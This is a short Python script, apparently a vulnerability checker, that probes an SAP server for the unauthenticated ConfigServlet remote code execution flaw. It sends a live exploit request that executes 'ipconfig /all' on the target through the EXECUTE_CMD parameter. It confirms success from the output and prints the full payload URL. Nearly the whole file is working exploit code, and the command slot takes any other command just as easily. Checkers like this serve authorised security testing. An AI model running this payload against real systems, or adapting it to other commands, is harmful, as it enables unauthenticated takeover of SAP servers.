# sapConfigServlet_rce.py
# description: checks for SAP ConfigServlet Remote Unauthenticated Remote Code Execution Vulnerability
# author: @shipcod3

import sys, urllib

print "########################################################"
print "# SAP ConfigServlet Remote Unauthenticated RCE Checker #"
print "########################################################"
print "-- by @shipcod3\n"

def usage():
     print("USAGE: python sapConfigServlet_rce.py host.com 50000")  

def main(argv):
  
    if len(argv) < 3:
        return usage()
    
    host = sys.argv[1]
    port = sys.argv[2]
    payload = "ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=ipconfig%20/all"
    
    print "[***] Checking {0}:{1} for Remote Code Execution".format(host, port)
    
    try:  
        url = urllib.urlopen("http://{0}:{1}/{2}".format(host, port, payload))
        msg = url.read()
    
        if url.code == 200 and "Windows IP Configuration" in msg:
            print "[!] Vulnerable to Remote Code Execution" 
            print "[+] Payload: http://{0}:{1}/{2}\n".format(host, port, payload)

        else:
            print "[-] Not Vulnerable!"   
    
    except:
        print "[-] Error! Check if host is online..."
        
if __name__ == "__main__":
    main(sys.argv)